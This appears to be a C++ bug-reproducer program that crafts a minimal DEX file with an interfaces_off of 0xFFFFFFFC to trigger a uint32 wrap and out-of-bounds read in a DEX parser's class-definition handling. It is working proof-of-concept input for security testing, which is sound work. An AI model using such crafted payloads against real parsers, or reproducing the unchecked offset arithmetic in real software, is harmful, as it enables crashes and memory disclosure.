// GP-582 ASan reproducer probe — GP-DEX-012 (dex_parser.cpp parse_class_defs
// sub-offset uint32 wrap). Crafts a minimal DEX whose single class_def
// carries interfaces_off = 0xFFFFFFFC so `interfaces_off + 4` wraps to 0 in
// uint32, passes the `<= current_size_` guard, then memcpy reads 4 bytes at
// data + 0xFFFFFFFC → OOB read ~4 GiB past the buffer.
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <vector>

#include "dex/dex_parser.h"

static void put32(std::vector<uint8_t>& v, size_t off, uint32_t x) {
    v[off] = x & 0xff; v[off+1] = (x>>8)&0xff; v[off+2] = (x>>16)&0xff; v[off+3] = (x>>24)&0xff;
}

int main() {
    // 0x90 = 0x70 header + 0x20 one class_def
    std::vector<uint8_t> dex(0x90, 0);
    std::memcpy(dex.data(), "dex\n035\0", 8);
    put32(dex, 32, (uint32_t)dex.size());  // file_size
    put32(dex, 36, 0x70);        // header_size
    put32(dex, 40, 0x12345678);  // endian_tag
    put32(dex, 56, 0);           // string_ids_size
    put32(dex, 60, 0);           // string_ids_off
    put32(dex, 64, 0);           // type_ids_size
    put32(dex, 68, 0);           // type_ids_off
    put32(dex, 72, 0);           // proto_ids_size
    put32(dex, 76, 0);           // proto_ids_off
    put32(dex, 80, 0);           // field_ids_size
    put32(dex, 84, 0);           // field_ids_off
    put32(dex, 88, 0);           // method_ids_size
    put32(dex, 92, 0);           // method_ids_off
    put32(dex, 96, 1);           // class_defs_size = 1
    put32(dex, 100, 0x70);       // class_defs_off = 0x70

    // class_def[0] at 0x70 (DexClassDef: 8 x u32)
    put32(dex, 0x70, 0);          // class_idx
    put32(dex, 0x74, 1);          // access_flags
    put32(dex, 0x78, 0xFFFFFFFF); // superclass_idx = NO_INDEX
    put32(dex, 0x7c, 0xFFFFFFFC); // interfaces_off — WRAP payload
    put32(dex, 0x80, 0xFFFFFFFF); // source_file_idx = NO_INDEX
    put32(dex, 0x84, 0);          // annotations_off
    put32(dex, 0x88, 0);          // class_data_off
    put32(dex, 0x8c, 0);          // static_values_off

    miniandroid::dex::DexParser parser;
    auto report = parser.parse_data(dex);
    printf("[GP-DEX-012] parse valid=%d error=%s classes=%zu\n",
           (int)report.is_valid,
           report.validation_error.c_str(), report.classes.size());
    printf("[GP-DEX-012] interfaces=%zu\n",
           report.classes.empty() ? 0 : report.classes[0].interfaces.size());
    printf("[PROBES-DONE]\n");
    return 0;
}
